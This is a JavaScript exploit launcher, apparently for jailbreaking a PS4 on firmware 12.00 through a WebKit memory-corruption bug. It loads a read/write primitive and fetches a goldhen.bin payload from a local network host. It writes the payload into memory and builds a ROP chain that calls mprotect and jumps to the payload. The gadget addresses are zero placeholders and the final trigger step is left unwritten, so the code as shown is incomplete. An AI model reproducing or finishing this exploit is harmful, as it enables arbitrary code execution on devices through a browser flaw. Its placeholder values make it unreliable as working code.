function launchExploit() {
  (async () => {
    try {
      alert("🚀 Starting PS4 12.00 WebKit Exploit...");

      // STEP 1: Trigger WebKit and wait for window.p
      const triggerVulnerability = () => {
        return new Promise((resolve, reject) => {
          try {
            const script = document.createElement("script");
            script.src = "loader.js"; // This is your webkit.js
            script.onload = () => {
              const checkPrim = setInterval(() => {
                if (window.p) {
                  clearInterval(checkPrim);
                  resolve(true);
                }
              }, 50);
            };
            script.onerror = () => reject("❌ Failed to load loader.js");
            document.body.appendChild(script);
          } catch (e) {
            reject(e);
          }
        });
      };

      const triggered = await triggerVulnerability();
      if (!triggered) {
        alert("❌ Failed to trigger WebKit exploit.");
        return;
      }

      alert("✅ WebKit exploit succeeded. R/W active!");

      // STEP 2: Fetch goldhen.bin
      const response = await fetch("http://192.168.0.193:8080/goldhen.bin");
      if (!response.ok) throw new Error("Failed to fetch goldhen.bin");
      const payloadBytes = new Uint8Array(await response.arrayBuffer());
      alert(`📦 Loaded goldhen.bin (${payloadBytes.length} bytes)`);

      // STEP 3: Write payload to memory
      const rwxAddr = 0x13370000;
      for (let i = 0; i < payloadBytes.length; i++) {
        window.p.write1({ low: (rwxAddr + i) >>> 0, hi: 0 }, payloadBytes[i]);
      }

      // STEP 4: mprotect(0x13370000, size, 0x7)
      const syscallAddr = 0x00000000; // REPLACE with syscall gadget (ret to syscall)
      const popRdi = 0x00000000; // REPLACE with pop rdi; ret
      const popRsi = 0x00000000; // REPLACE with pop rsi; ret
      const popRdx = 0x00000000; // REPLACE with pop rdx; ret
      const popRax = 0x00000000; // REPLACE with pop rax; ret
      const jmpRax = 0x00000000; // REPLACE with jmp rax or call rax
      const ropChainAddr = 0x13371000;

      const chain = [
        popRdi, rwxAddr,
        popRsi, payloadBytes.length,
        popRdx, 0x7,
        popRax, 10,           // syscall: mprotect
        syscallAddr,
        rwxAddr               // jump to payload
      ];

      for (let i = 0; i < chain.length; i++) {
        window.p.write8({ low: ropChainAddr + i * 8, hi: 0 }, new int64(chain[i], 0));
      }

      alert("💣 ROP chain written.");

      // STEP 5: Trigger execution (overwrite return address or call gadget)
      // You must overwrite a vulnerable object or function pointer
      // Example (pseudo):
      // window.p.write8({low: returnAddr}, new int64(ropChainAddr, 0));
      alert("🚀 Jumping to ROP chain...");
      // your trigger code here

    } catch (e) {
      alert(`❌ Exploit failed: ${e.message}`);
      console.error(e);
    }
  })();
}
